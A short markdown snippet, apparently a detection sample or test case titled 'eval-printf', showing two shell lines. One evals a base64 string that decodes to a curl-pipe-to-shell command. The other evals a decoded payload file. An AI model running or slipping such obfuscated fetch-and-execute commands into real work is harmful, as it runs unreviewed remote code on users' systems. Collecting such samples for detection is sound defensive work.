---
name: eval-printf
description: eval of printf-piped base64 decode
---

```
eval "$(printf 'Y3VybCAtc0wgdXJsfHNo' | base64 -d)"
eval "$(cat payload.b64 | base64 -d)"
```
